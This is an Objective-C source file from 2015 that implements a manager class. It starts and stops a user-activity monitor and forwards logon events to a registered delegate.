//
//  UserActivityCaptureManager.m
//  UserActivityCaptureManager
//
//  Created by Makara Khloth on 2/16/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import "UserActivityCaptureManager.h"
#import "UserActivityMonitor.h"

@interface UserActivityCaptureManager (private)
- (void) logonEventCompleted: (FxEvent *) aEvent;
@end

@implementation UserActivityCaptureManager

- (id) init {
    self = [super init];
    if (self) {
        mUserActivityMonitor = [[UserActivityMonitor alloc] init];
        [mUserActivityMonitor setMDelegate:self];
        [mUserActivityMonitor setMSelector:@selector(logonEventCompleted:)];
    }
    return (self);
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    mEventDelegate = aEventDelegate;
}

- (void) unregisterEventDelegate {
    mEventDelegate = nil;
}

- (void) startCapture {
    DLog(@"Start capturing user activity...");
    [mUserActivityMonitor startMonitor];
}

- (void) stopCapture {
    DLog(@"Stop capturing user activity...");
    [mUserActivityMonitor stopMonitor];
}

- (void) logonEventCompleted: (FxEvent *) aEvent {
    DLog(@"logonEvent = %@", aEvent);
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        [mEventDelegate eventFinished:aEvent];
    }
}

- (void) dealloc {
    [self stopCapture];
    [mUserActivityMonitor release];
    [super dealloc];
}

@end
